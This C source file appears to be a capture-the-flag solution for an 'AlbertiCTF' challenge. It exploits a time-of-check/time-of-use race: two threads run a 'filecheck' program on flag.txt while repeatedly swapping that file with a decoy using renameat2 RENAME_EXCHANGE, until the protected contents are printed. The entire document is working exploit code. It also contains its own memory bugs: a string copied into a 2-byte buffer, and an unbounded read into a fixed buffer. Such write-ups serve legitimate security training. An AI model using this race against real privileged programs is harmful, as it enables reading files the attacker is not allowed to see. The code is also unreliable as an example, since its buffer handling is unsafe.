/* gcc exploit.c -o exploit -lpthread */
/*
# --- Info ---
# CTF: AlbertiCTF
# Date: *
# Challenge: win
# Description: TOC-TOU (Time-Of-Check Time-Of-Use) to trick program and get the flag
# Author: @lockedbyte
# --- End Info ---
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>
#include <pthread.h> 
#include <string.h>

#define PROG "filecheck"
#define TARGETFILE "flag.txt"
#define TMPFILE "pthread.txt"

int tmpCreate() {
    char tmpFile[2];
    strcpy(tmpFile, "pwned");
    fprintf(stderr, "[.] Creating tmp file...\n");
    FILE *fp;
    fp = fopen(TMPFILE, "w");
    if(!fp) {
        fprintf(stderr, "[-] tmp file creation failed!\n");
        return 0;
    }
    fwrite(tmpFile, 1, sizeof(tmpFile), fp);
    fclose(fp);
    fprintf(stderr, "[~] tmp file created successfully\n");
    
    return 1;
}

int spawnPthread() {
    while(1) {
        char buf[100];
        char pName[100];
        
        strcpy(pName, "./");
        strcat(pName, PROG);
        strcat(pName, " ");
        strcat(pName, TARGETFILE);

        FILE *fp;
        fp = popen(pName, "r");
        if (fp == NULL) {
            return 0;
        }
        int i = 0;
        int xflag = 0;
        char ch;
        while((ch = fgetc(fp)) != EOF) {
            buf[i] = ch;
            if(i == 0) {
                if(buf[i] == 0x43) {
                    xflag = 1;
                    fprintf(stderr, "[.] Dumping flag...\n");
                } else {
                    break;
                }
            }
            i++;
        }
        if(xflag) {
            fprintf(stderr, "[~] Got flag: %s", buf);
            exit(0);
        }
        pclose(fp);
    }
    
    return 0;
}

int pwnPthread() {
    while(1) {
        syscall(SYS_renameat2, 
                AT_FDCWD, 
                TARGETFILE, 
                AT_FDCWD, 
                TMPFILE, 
                RENAME_EXCHANGE);
    }
    
    return 0;
}


int main(int argc, char *argv[]) {

    int fn;
    
    fn = tmpCreate();
    
    if(!fn)
        exit(1);
    
    pthread_t spawnThreadId;
    pthread_t pwnThreadId;

    fprintf(stderr, "[.] Initializing 'spawnThreadId' pthread -> spawnPthread()\n");
    pthread_create(&spawnThreadId, NULL, spawnPthread, NULL);
    fprintf(stderr, "[.] Initializing 'pwnThread' pthread -> pwnPthread()\n");
    pthread_create(&pwnThreadId, NULL, pwnPthread, NULL);

    pthread_exit(NULL);

    return 0;
    
}



